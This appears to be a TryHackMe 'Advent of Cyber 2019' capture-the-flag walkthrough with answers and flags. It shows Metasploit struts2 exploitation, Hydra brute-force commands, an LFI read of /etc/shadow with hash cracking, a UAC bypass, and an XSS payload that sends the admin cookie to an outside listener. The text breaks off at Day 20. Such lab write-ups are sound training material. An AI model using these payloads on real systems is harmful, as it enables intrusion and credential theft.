<p align="center">
   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Advent_of_Cyber_1_2019_Logo.png" alt="Advent of Cyber 1 2019 Logo">
</p>

# Advent of Cyber 1 [2019]

This guide contains the answer and steps necessary to get to them for the [Advent of Cyber](https://tryhackme.com/room/25daysofchristmas) room.

## Table of contents

- [[Day 1] Inventory Management](#day-1-inventory-management)
- [[Day 2] Arctic Forum](#day-2-arctic-forum)
- [[Day 3] Evil Elf](#day-3-evil-elf)
- [[Day 4] Training](#day-4-training)
- [[Day 5] Ho-Ho-Hosint](#day-5-ho-ho-hosint)
- [[Day 6] Data Elf-iltration](#day-6-data-elf-iltration)
- [[Day 7] Skilling Up](#day-7-skilling-up)
- [[Day 8] SUID Shenanigans](#day-8-suid-shenanigans)
- [[Day 9] Requests](#day-9-requests)
- [[Day 10] Metasploit-a-ho-ho-ho](#day-10-metasploit-a-ho-ho-ho)
- [[Day 11] Elf Applications](#day-11-elf-applications)
- [[Day 12] Elfcryption](#day-12-elfcryption)
- [[Day 13] Accumulate](#day-13-accumulate)
- [[Day 14] Unknown Storage](#day-14-unknown-storage)
- [[Day 15] LFI](#day-15-lfi)
- [[Day 16] File Confusion](#day-16-file-confusion)
- [[Day 17] Hydra-ha-ha-haa](#day-17-hydra-ha-ha-haa)
- [[Day 18] ELF JS](#day-18-elf-js)
- [[Day 19] Commands](#day-19-commands)
- [[Day 20] Cronjob Privilege Escalation](#day-20-cronjob-privilege-escalation)
- [[Day 21] Reverse Elf-ineering](#day-21-reverse-elf-ineering)
- [[Day 22] If Santa, Then Christmas](#day-22-if-santa-then-christmas)
- [[Day 23] LapLANd (SQL Injection)](#day-23-lapland-sql-injection)
- [[Day 24] Elf Stalk](#day-24-elf-stalk)
- [[Day 25] Challenge-less](#day-25-challenge-less)

### [Day 1] [Inventory Management](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/25daysofchristmas/Day%2001)

In this task we need to use cookies to account another users account.

1. What is the name of the cookie used for authentication?

   First we need to create an account on the website to view the cookie we get.
   
   ![Register]()
   
   Now we login and open the developer tools to look at the cookie stored in our browser. Here we find its name.
   
   ![Cookie]()

   ><details><summary>Click for answer</summary>authid</details>

2. If you decode the cookie, what is the value of the fixed part of the cookie?

   We can decode the cookie using Cyber Chef. It looks like a Base64 encoding and this is exactly what Cyber Chef suggest.
   
   ![Cyber Chef Decoding]()
   
   We see the cookie is our username and a random string of characters. Could this be a fixed part for all cookies?

   ><details><summary>Click for answer</summary>v4er9ll1!ss</details>
   
3. After accessing his account, what did the user mcinventory request?

   Lets find out. Adding the username `mcinventory` in front of the fixed part of the cookie and decoding it through Cyber Chef we get the following cookie:
   
   ![Cyber Chef Encoding]()
   
   Change the value of our existing cookie to the value we just created and reload the page. Looks like we are now logged in as mcinventory. On the home page we can see what het requested.
   
   ![Item]()

   ><details><summary>Click for answer</summary>firewall</details>

### [Day 2] [Arctic Forum](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/25daysofchristmas/Day%2002)

In this task we will be using brute forcing to find hidden webpages.

1. What is the path of the hidden page?

   We will use DirSearch to find any hidden directories on the server. Using the following command:
   
   ```cmd
   dirsearch -u 10.10.101.69:3000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r
   ```
   
   ![DirSearch Results]()

   ><details><summary>Click for answer</summary>/sysadmin</details>

2. What is the password you found?

   Doing a little bit of OSINT research, we can look at the source of the website. Looks like there is a reference to a developer github page. Searching for `Arctic Digital Design` we find the following Github page with some default credentials.
   
   ![Default Credentials]()

   ><details><summary>Click for answer</summary>defaultpass</details>

3. What do you have to take to the 'partay'

   Using the default credentials we found, we can login to the sysadmin page. On this page we find what to bring to the party.
   
   ![Entry]()

   ><details><summary>Click for answer</summary>Eggnog</details>

### [Day 3] Evil Elf



### [Day 4] Training



### [Day 5] Ho-Ho-Hosint



### [Day 6] Data Elf-iltration



### [Day 7] Skilling Up



### [Day 8] SUID Shenanigans



### [Day 9] [Requests](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/25daysofchristmas/Day%2009)

Machine IP:

**10.10.169.100**

1. What is the value of the flag?

   I had issues connecting to the machine (yes my VPN was turned on). There was no response using the script or through the browser.
   Doing a quick nmap scan did reveal the machine to exist with port 3000. However, it was listed as filtered. This probably means the machine or service is not active anymore. It is a room from 2019 so..

   ![nmap host discovery scan](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/662ac889742dbaa306d7446d36e33af4036bf853/25daysofchristmas/Day%2009/nmap_host_discovery.png)

   Anyway, by using the [supplied documentation](https://docs.google.com/document/d/1FyAnxlQpzh0Cy17cKLsUZYCYqUA3eHu2hm0snilaPL0/) I came up with the following [script](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/662ac889742dbaa306d7446d36e33af4036bf853/25daysofchristmas/Day%2009/Script.py) which would have hopefully found the flag.

   ```python
   import requests

   path = ''
   host = 'http://10.10.169.100:3000/'

   values = ''

   response = requests.get(host + path)
   print(response)
   json_respons = response.json()
   path = "/" + json_respons["next"]
   if path != "/end":
   	values += json_respons["value"]

   print("The flag is " + values)
   ```

   Since this room is now probably not useable anymore, I think it wouldn't be a problem to post the flag itself to allow others to finish this room.

   ><details><summary>Click for answer</summary>sCrIPtKiDd</details>

### [Day 10] [Metasploit-a-ho-ho-ho](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/25daysofchristmas/Day%2010)

In this task we need to find an exploit for the webserver and gain access using Metasploit. We can use this [blog post](https://blog.tryhackme.com/metasploit/) to guide us.

Machine IP:

**10.10.154.103**

First we run an nmap scan to find out more about our target machine.

![nmap host discovery](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2010/nmap_host_discovery.png)

We can see there is an Apache Coyote 1.1 service running on port 80 which is of interest to us. From the documentation we find we will be exploiting the struts2  vulnerability.

So open up Metasploit with the `msfconsole` command and type `search struts2` to find any modules we can use.

![Metasploit module search](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2010/msfconsole_search.png)

For this task we will be using the `exploit/multi/http/struts2_content_type_ognl` module. Type `use` and the module name to select it.

![Select module and show options](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2010/msfconsole_options.png)

Next we will fill out the required information for our payload. Type `show options` to list all the options.
In our example we will set the RHOST, RPORT, and TARGETURI. The LHOST was set correctly. If not, use `ifconfig` to find your ip address under eth0 or tun0 (deppending other wether or not you are using a VPN. After that is done type `run` to run the exploit.

![Add information and run](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2010/msfconsole_setandrun.png)

In our case the TARGETURI will be `/showcase.action` as this is the base address for the webserver.

![Browser view of our webserver](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2010/browser_webapplication.png)

Now we have our session running on the target machine.

1. Compromise the web server using Metasploit. What is flag1?

   To find the flag we will use the `find` command. However, we first need to change our meterpreter session to a regular shell by using typing `shell` into our session.

   ![Metasploit flag search](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2010/msfconsole_flag.png)

   ><details><summary>Click for answer</summary>THM{3ad96bb13ec963a5ca4cb99302b37e12}</details>

2. Now you've compromised the web server, get onto the main system. What is Santa's SSH password?

   Going through some of the directories, we find a file called `ssh-creds.txt`. This look interesting. Inside we find some credentials we can use to ssh into the machine.

   ![SSH credentials](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2010/msfconsole_searchcreds.png)

   ![SSH credentials](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2010/msfconsole_sshcreds.png)

   ><details><summary>Click for answer</summary>rudolphrednosedreindeer</details>

3. Who is on line 148 of the naughty list?

   In terminal window (not meterpreter) we can ssh into the machine and look around for the files. We spot two lists here.

   ![Directory files](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2010/ssh_directory.png)

   To see who is on line 148 of the naughty list we could just count the lines, but using cat with some extra options will be easier.

   ```cmd
   cat -n naughty_list.txt | grep -i 148
   ```

   The `-n` argument shows line numbers in the output which we can use to search with `grep`.

   Produces

   ![Naughty list result](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2010/ssh_naughty.png)

   ><details><summary>Click for answer</summary>Melisa Vanhoose</details>

4. Who is on line 52 of the nice list?

   Same command can be used here.

   ```cmd
   cat -n nice_list.txt | grep -i 52
   ```
   Produces

   ![Naughty list result](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2010/ssh_nice.png)

   ><details><summary>Click for answer</summary>Lindsey Gaffney</details>

### [Day 11] [Elf Applications](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/25daysofchristmas/Day%2011)

In this task we need to access some services on the target machine. See the accompanying [documentation](https://docs.google.com/document/d/1qCMuPwBR0gWIDfk_PXt0Jr220JIJAQ-N4foDZDVX59U/edit#) for mor help.
Machine IP:
10.10.223.45

We first run an nmap scan to find all available services on the target machine by running:

```cmd
nmap -sV 10.10.223.45
```

![Nmap host scan](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2011/Elf_Applications_Nmap_Scan.png)

Here we can see we have three services running on their default ports. FTP on port 21, NFS on port 111, and MySQL on port 3306.

1. What is the password inside the creds.txt file?

   To get the password we need to access the NFS service. First we need to find out which shares are available for us to mount

   ```cmd
   showmount -e 10.10.223.45
   ```

   Now we can mount this share to our system.

   ```cmd
   sudo mount 10.10.223.45:/opt/files /mnt
   ```

   ![Mounting NFS share](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2011/Elf_Applications_NFS_Mount.png)

   Now we can go to the newly mounted directory and read the contents of the file.

   ![Read file from NFS share](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2011/Elf_Applications_NFS_Open_File.png)

   The file can also be opened from the folder itself.

   ![Access NFS through folder](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2011/Elf_Applications_NFS_File_Directory.png)

   ><details><summary>Click for answer</summary>securepassword123</details>

2. What is the name of the file running on port 21?

   The FTP service is active on port 21, so we will see if we can login anonymously.

   ![Login anynomously to FTP](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2011/Elf_Applications_FTP_Login.png)

   Success! No lets search for the file and copy it to our machine with the `get` command.

   ![Download FTP file](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2011/Elf_Applications_FTP_FIle_Download.png)

   ><details><summary>Click for answer</summary>file.txt</details>

3. What is the password after enumerating the database?

   Reading the `file.txt` file we found on the FTP server, we see it contains some credentials for a SQL service. Lets see if they still work.

   ![FTP file contents](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2011/Elf_Applications_FTP_File_Open.png)

   ```cmd
   mysql -u root -p 10.10.223.445
   ```

   ![MySQL Login](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2011/Elf_Applications_SQL_Login.png)

   Now we need to see which database we need by running the `show databases` command.

   ![MySQL Show Databases](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2011/Elf_Applications_SQL_Show_Databases.png)

   After trying several databases we find another one that might be interesting. Lets change to use that one.

   ![MySQL Use Database](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2011/Elf_Applications_SQL_Change_DB.png)

   Does is contain any interesting tables? It looks like it! Lets enumerate the content of the table.

   ```sql
   SELECT * FROM USERS
   ```

   ![MySQL User Creds](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2011/Elf_Applications_SQL_User_Creds.png)

   ><details><summary>Click for answer</summary>bestpassword</details>

### [Day 12] [Elfcryption](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/25daysofchristmas/Day%2012)

In this task we will look at various encryption techniques to decrypt some files we received. The supporting documentation can be found [here](https://docs.google.com/document/d/1xUOtEZOTS_L8u_S5Fbs1Wof7mdpWQrj2NkgWLV9tqns/edit?usp=sharing).

We first unzip the contents of the file using either the `unzip tosend.zip` command or through the GUI.

1. What is the md5 hashsum of the encrypted note1 file?

   To read the md5 hash of the `note1.txt.gpg` file we use the following command:
   
   ```cmd
   md5sum note1.txt.gpg
   ```
   
   ![GPG File Hash](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2012/Encryption_GPG_Hash.png)

   ><details><summary>Click for answer</summary>24cf615e2a4f42718f2ff36b35614f8f</details>

2. Where was elf Bob told to meet Alice?

   To decrypt the file we need a passphrase. I didn't know what it was so I used to one provided by the hint: `25daysofchristmas`. Now we can decrypt it by using typing `gpg -d note1.txt.gpg1` and entering the passphrase when prompted.
   
   ![GPG File Decrypt](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2012/Encryption_GPG_Decrypt.png)

   ><details><summary>Click for answer</summary>santa's grotto</details>

3. Decrypt note2 and obtain the flag!

   To decrypt the message we use the command as specified in the supporting material. Again, we use the passphrase supplied by the hint `hello`.
   
   ```cmd
   openssl rauthl -decrypt -inkey private.key -in note2_encrypted.txt -out note2_decrypted.txt
   ```
   
   ![AES File Decrypt](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2012/Encryption_AES_Decrypt.png)

   ><details><summary>Click for answer</summary>THM{ed9ccb6802c5d0f905ea747a310bba23}</details>

### [Day 13] [Accumulate](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/25daysofchristmas/Day%2013)

In this task we are asked to use our previously gathered knowledge to gain access to a system with only its IP address.

The first thing we do, is run a network scan to find all open ports and their services.

```cmd
nmap -sV 10.10.85.141
```

![Nmap Network Scan](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2013/Accumulate_Nmap_scan.png)

Here we see a server running on port 80. Remember the other service for later. 

1. A web server is running on the target. What is the hidden directory which the website lives on?

   Lets open the browser and navigate to the machine's IP and port 80. Here we indeed find a page for windows server. None of the links on this page will lead us anywhere, as there is no internet connections. Instead we will use a tool we used in day 2 of this challenge `dirsearch`. With the following command we can enumerate different directories present on the server.
   
   ```cmd
   dirsearch -u 10.10.85.141:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
   ```
   
   ![DirSearch Results](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2013/Accumulate_Dirsearch_Enumeration.png)
   
   This quickly gives us a directory to use. When navigating to the website, we see this is indeed available!
   
   ![Retro Website](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2013/Accumulate_Website.png)

   ><details><summary>Click for answer</summary>/retro</details>

2. Gain initial access and read the contents of user.txt

   We need to find a way into the system and read its contents. First we start looking around for any interesting information on the blog. None of the posts have anything of interest. However, we can also see a comment posted by Wade the author. This seems to hold some private stuff you would not want out in the open. Could it possibly be a password?
   
   ![Website Comment](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2013/Accumulate_Website_Comment.png)
   
   After some searching we find a login page for the Wordpress website. We can indeed login using the password we found earlier and username Wade. However, this will again lead us nowhere, as we cannot access the files from here. Remember the other service we found running on port 3389? A quick Google search tells us this is used for RPD connections, how fortunate!
   
   Using Remmina with `remmina -c rdp:wade@10.10.85.141:80` to login to the machine we need to supply a password at the prompt.
   
   ![RDP Login](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2013/Accumulate_RDP_Login.png)
   
   Here we find a conveniently placed file on our desktop. Sweet!

   ><details><summary>Click for answer</summary>THM{HACK_PLAYER_ONE}</details>

3. [Optional] Elevate privileges and read the content of root.txt

   This question was a though one, as there was no possibility for me to find out where to go next without a guide. The hint mentioned we should look for what the user was searching for. So the first thing I did was opening Internet Explorer to find any browser hidtory. This was empty.. Looking at other people's writeups, I saw they also had Chrome installed. I, unfortunately, didn't.
   
   ![Desktop Screen](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2013/Accumulate_RDP_Screen.png)
   
   I took the liberty of viewing the users browser history another user [posted](https://muirlandoracle.co.uk/2020/01/06/tryhackme-christmas-2019-challenge-write-up/#Day_Thirteen_-_Accumulate). Apparently, they were searching for a CVE. Perhaps the system is vulnerable to it.
   
   After another Google [search](https://github.com/nobodyatall648/CVE-2019-1388) I learned we could exploit the vulnerability to obtain a cmd shell with elevated priveleges through the UAC window.
   
   I this case we can open the `.exe` file on the desktop to open a UAC prompt and view the certificate.
   
   ![View Certificate](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2013/Accumulate_Root_Certificate.png)
   
   Clicking on the link for the certificate issuer should spawn a browser instance with elevated priveleges as it originates from the `.exe`.
   
   **Important note!** `Make sure no browser window is currently open before visiting the link. Otherwise, the link will be opened in the browser instance without priveleges.`
   
   In the opened browser window we get a connection error, but we can ignore that. We need to save this page as. Either through the menu or with `Ctrl + S`. 
   
   ![Save as Prompt](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2013/Accumulate_Root_Save.png)
   
   In the path bar we write: `C:\Windows\System32\cmd.exe` and press Enter.
   
   A cmd shell should openen with elevated priveleges. Lets check.
   
   ![Cmd Window](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2013/Accumulate_Root_Cmd.png)
   
   Lets find out which admin user we should login to.
   
   ![Cmd Window Admin](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2013/Accumulate_Root_Admin.png)
   
   Looks like it is called `Administrator`. 
   
   Moving into this directory we can search for the text file using:
   
   ```bat
   dir "root.txt" /S
   ```
   
   ![Cmd Root File](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2013/Accumulate_Root_File.png)
   
   Now we can open this file and read the flag!

   ><details><summary>Click for answer</summary>THM{COIN_OPERATED_EXPLOITATION}</details>

### [Day 14] [Unknown Storage](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/25daysofchristmas/Day%2014)

In this task we will need to look for leaked information from an improperly configured AWS bucket. The supporting material can be found [here](https://docs.google.com/document/d/13uHBw3L9wdDAFboErSq_QV8omb3yCol0doo6uMGzJWo/edit#).

1. What is the name of the file you found?

   All we need here is the name of the bucket `advent-bucket-one`.
   
   We can navigate to `advent-bucket-one.s3.amazonaws.com` to see if the bucket is publicly accessible. And if so, which file is available.
   
   ![AWS Bucket Information](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2014/Storage_AWS_Bucket.png)
   
   ><details><summary>Click for answer</summary>employee_names.txt</details>

2. What is in the file?

   To view a certain file, we can either use the AWS CLI (account necessary) or through the browser. In this case it is easier to use the browser.
   
   `advent-bucket-one.s3.amazonaws.com/employee_names.txt`
   
   ><details><summary>Click for answer</summary>mcchef</details>

### [Day 15] [LFI](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/25daysofchristmas/Day%2015)

In this task, we will use Local File Inclusion in order to find a password to a server. Use the supporting information found [here](https://blog.tryhackme.com/lfi/).

**Machine IP: 10.10.253.159**

1. What is Charlie going to book a holiday to?

   When we open the ip address in our browser we can see the notes Charlie has been taken.
   
   ![Website Notes](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2015/LFI_Website.png)

   ><details><summary>Click for answer</summary>Hawaii</details>

2. Read /etc/shadow and crack Charlies password.

   Looking at the source code of the website, we notice this piece of code.
   
   ![Website Source Code](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2015/LFI_Source_Code.png)
   
   Looks like it is loading in content from other files. It uses the `/get-file/` command followed by the patch of the file. Let try reading the `/etc/shadow` file for some passwords.
   
   **Note.** This can also be done using Burpsuite's Intercept function.
   
   ![Website Shadow](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2015/LFI_Shadow.png)
   
   Here we find a password for the user Charlie. Looks like it is a hashed password. From Hashcats [examples](https://hashcat.net/wiki/doku.php?id=example_hashes) page, this looks like a SHA512 hash (1800).
   
   Copy and save the password to a file to be used with Hashcat.
   
   **Note!** Make sure you copy to entire (and correct) part of the hash. Everything between ':' and ':'. Otherwise the length might not be what is expected by Hashcat.
   
   Using hascat with the following command, we can try to find out what the password was (hashcat didn't work on a VM, so I had to switch to Windows).
   
   ```cmd
   hashcat.exe -m 1800 password.txt rockyou.txt
   ```
   
   ![Hashcat Progress](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2015/LFI_Hashcat_Cracked.png)

   ><details><summary>Click for answer</summary>password1</details>

3. What is flag1.txt?

   ![Nmap Scan](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2015/LFI_Nmap_Scan.png)
   
   From our previously done Nmap scan, we see port 22 is open for an SSH connection. Lets try our credentials here.
   
   ```cmd
   ssh charlie@10.10.259.143
   ```
   
   ![SSH Login](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2015/LFI_SSH_Login.png)
   
   Now we just need to find and read the flag.
   
   ![SSH File](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2015/LFI_SSH_File.png)
   
   ><details><summary>Click for answer</summary>THM{4ea2adf842713ad3ce0c1f05ef12256d}</details>

### [Day 16] [File Confusion](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/25daysofchristmas/Day%2016)

In this task we are using python to automate several tasks on some zipped files. The suppoting documentation can be found [here](https://docs.google.com/document/d/13eYEcqpyp3fIAnaDR8PHz6qibBJJwf2Vp5M77KkEKtw/edit#).

1. How many files did you extract(excluding all the .zip files)

   The following code was used to unzip all files.

   ```python
   ListofZips = os.listdir("/Files/")
   for m in ListofZips:
      with zipfile.ZipFile('/Files/' + m , 'r') as zip_files:
      zip_files.extractall('/Files/')
   ```

   ><details><summary>Click for answer</summary>50</details>

2. How many files contain Version: 1.1 in their metadata?

   I could not get the exiftool installed properly and it would not import in my script.

   ><details><summary>Click for answer</summary>3</details>

3. Which file contains the password?

   T.b.d.

   ><details><summary>Click for answer</summary>dL6w.txt</details>

### [Day 17] [Hydra-ha-ha-haa](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/25daysofchristmas/Day%2017)

In this task we will be using [Hydra](https://en.kali.tools/?p=220) (can be downloaded [here](https://github.com/vanhauser-thc/thc-hydra) if needed) to brute force a password for someones web application login and SSH login. The supporting material can be found [here](https://tryhackme.com/resources/blog/hydra).

With a quick Nmap scan we can see there are indeed two open ports (22 and 80).

![Nmap Scan](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2017/Hydra_Nmap_Scan.png)

1. Use Hydra to bruteforce molly's web password. What is flag 1? (The flag is mistyped, its THM, not TMH)

   We first visit the website on the target ip and port 80 (without the port it will still redirect).
   
   ![Website Login](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2017/Hydra_Website_Login.png)
   
   After inspecting the page, we see the form uses the `POST` method and the fields of interest are called `username` and `password`.
   
   Using the documentation we can write the following hydra command to try and crack Molly's password.
   
   ```cmd
   hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.52.128 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
   ```
   
   - **-l** = username
   - **-P** = password list
   - **/login** = the page to which hydra directs the request
   - **username & password** = the fields to enter data into
   
   ![Hydra Website Password](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2017/Hydra_Web_Password.png)
   
   With the found password we can now login in to website and find the flag.

   ><details><summary>Click for answer</summary>THM{2673a7dd116de68e85c48ec0b1f2612e}</details>

2. Use Hydra to bruteforce molly's SSH password. What is flag 2?

   To crack molly's ssh password we use the following command with Hydra:
   
   ```cmd
   hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.52.128 ssh -t 4
   ```
   
   - **-t** = number of threads
   
   ![Hydra SSH Password](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2017/Hydra_SSH_Password.png)
   
   Using this password we can login to the machine through ssh with:
   
   ```cmd
   ssh molly@10.10.52.128
   ```
   
   ![SSH Login](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2017/Hydra_SSH_Logged_In.png)
   
   Here we can find the flag.
   
   ![SSH Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2017/Hydra_SSH_Flag.png)

   ><details><summary>Click for answer</summary>THM{c8eeb0468febbadea859baeb33b2541b}</details>

### [Day 18] [ELF JS](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/25daysofchristmas/Day%2018)

In this task we will exploit an XXS vulnerability using Javasctipt to get access to the admin cookie. The supporting documentation can be found [here](https://docs.google.com/document/d/19TJ6ANmM-neOln0cDh7TPMbV9rsLkSDKS3nj0eJaxeg/edit#).

1. What is the admin's authid cookie value?

   After registering ourselves on the website, it is time to find out where we can use this XSS vulnerability. 
   
   Using the code `<script>alert(1)</script>` in the form for the message, we observe this is where the vulnerability is at. 
   
   ![Alert Concept](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2018/ELF_JS_Concept.png)
   
   This also works for displaying our cookie for this session using: `<script>alert(document.cookie);</script>`
   
   ![Alert Cookie](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2018/ELF_JS_Cookie.png)
   
   Using the documentation we see that we can redirect the user to a website controlled by us which contains the cookie data within the request. `<script>window.location = ‘attacker-web-site.com/page?param=’ + document.cookie </script>`
   
   It also stated we should close any paragraphs. From de developer tool we can indeed see the information of the messages is placed within `<p>` tags, so we need to close those as well.
   
   Altering the code line we get the following:
   
   ```html
   </p><script>window.location = "http://10.18.78.136:1337/mine.html?cookie="+ document.cookie;</script><p>
   ```
   
   The IP address is our machine and the port is a 'randomly' chosen number. Then we need a fake page and parameter.
   
   No we setting a listener on our machine using `netcat` to listen to any request made on port 1337.
   
   ```cmd
   nc -lvp 1337
   ```
   
   - **-l** = specifies using listening mode
   - **-v** = verbose logging
   - **-p** = specifies port number to listen on

   **Note!** This apparently works, as the admin will periodically visit the website, meaning their connection will be forwarded to our machine. This was unclear to me at first.

   ![Netcat Request](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2018/ELF_JS_Netcat_Cookie.png)
   
   **Note!** The code we used here `window.location` actually redirects the user to our address. This effectivly renders the website useless as it is constantly redirecting traffic. This means we have to input our code correct in one try. Otherwise we have to restart the VM. It is clear this is not the perfect command as it will alert the owners, however, for now this was the best I could find by myself.

   ><details><summary>Click for answer</summary>2564799a4e6689972f6d9e1c7b406f87065cbf65</details>
   
### [Day 19] [Commands](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/25daysofchristmas/Day%2019)

In this task we will explore the possibilities of using system commands through a web application. The supporting material can be found [here](https://docs.google.com/document/d/1W65iKmUMtz-srteErhrGFJkWBXJ4Xk5PYlCZVMIZgs8/edit).

1. What are the contents of the user.txt file?

   When accessing the website on ip address 3000 we only see some text.
   
   ![Website](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2019/Commands_Website.png)
   
   We are told, something intersting was found on the `api/cmd/` endpoint. Navigating there we find the following:
   
   ![Website Endpoint](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2019/Commands_Directory.png)
   
   Eventhough this doesn't give us anything, we can see from a quick dirsearch, that it does indeed exist. In fact, we see various names that look like commands which we might be able to use.
   
   ![Website Dirsearch](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2019/Commands_DirSearch.png)
   
   After testing a few, this does in deed looks to be the case.
   
   ![Website LS](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2019/Commands_Ls.png)
   
   Lets try a command to find our text file, since we know what it is called. We use `find -name user.txt` to get the following:
   
   ![Find File](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2019/Commands_Find_File.png)
   
   Now we know where we can find it, we will try reading the file using `cat`. However, this time `cat /home/bestadmin/user.txt` didn't work.
   
   ![URL](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2019/Commands_URL.png)
   
   So we need to encode the URL ('/' and 'space'). We can do so using CyberChef.
   
   ![URL Encode](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2019/Commands_URL_Encode.png)
   
   Now we can read the file with the encoded URL.
   
   ![Flag Text](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2019/Commands_Flag_Text.png)

   ><details><summary>Click for answer</summary>5W7WkjxBWwhe3RNsWJ3Q</details>

### [Day 20] [Cronjob Privilege Escalation](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/25daysofchristmas/Day%2020)

In this task we are tasked to hack into Sam's account and elevate our priveleges usin a running cronjob.
There is no supporting material for this task, but I used [this](https://vk9-sec.com/exploiting-the-cron-jobs-misconfigurations-privilege-escalation/) to help me understand how to exploit cronjobs to elevate our priveleges.

1. What port is SSH running on?

